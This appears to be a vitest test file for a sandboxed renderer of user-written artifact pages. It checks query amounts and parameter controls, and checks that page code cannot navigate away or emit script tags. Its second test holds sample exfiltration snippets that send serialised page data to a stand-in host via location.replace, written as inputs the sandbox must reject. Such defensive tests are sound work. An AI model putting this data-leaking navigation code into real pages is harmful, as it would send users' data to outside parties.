import { describe, expect, it, vi } from "vitest";
import { compileCard } from "@/lib/cards/sandbox";
import { renderPage, type PageVersion } from "./artifact-page";

vi.mock("./artifact-data", async original => ({ ...await original<typeof import("./artifact-data")>(), runArtifactQueries: async () => ({ balance: { amount_minor: "12345", currency_code: "EUR" } }) }));

const context = { workspace: { id: "workspace", locale: "en" }, settings: { timezone: "UTC" } } as never;
const page = (source: string): PageVersion => ({ id: "version", artifact_id: "artifact", version: 1, html: null, compiled: compileCard(source), queries: [], params: [] });

describe("constrained artifact Pages", () => {
  it("renders exact query amounts and declared controls through the checked tree", async () => {
    const version = page(`export default function Page({ data, params }) { return <div><Kit.Money minor={data.balance.amount_minor} currency={data.balance.currency_code} /><Kit.Param name="pick" /><p>{params.pick}</p></div>; }`);
    version.params = [{ kind: "choice", name: "pick", options: [{ value: "a", label: "Alpha" }, { value: "b", label: "Beta" }], default: "a" }];
    const rendered = await renderPage(version, context, { pick: "b" });
    expect(rendered.error).toBeNull();
    expect(JSON.stringify(rendered.tree)).toContain('"minor":"12345"');
    expect(JSON.stringify(rendered.tree)).toContain('"children":["b"]');
    expect(rendered.params[0].value).toBe("b");
  });

  it("gives Page code no navigation API and rejects browser executable output", async () => {
    const navigation = await renderPage(page(`export default function Page({data}) { location.replace("https://receiver.invalid/?data=" + JSON.stringify(data)); return <p>oops</p>; }`), context);
    expect(navigation.tree).toBeNull();
    expect(navigation.error).toMatch(/location.*not defined/);
    const script = await renderPage(page(`export default function Page() { return <script>location.replace("https://receiver.invalid")</script>; }`), context);
    expect(script.tree).toBeNull();
    expect(script.error).toContain("<script> is not allowed");
  });
});
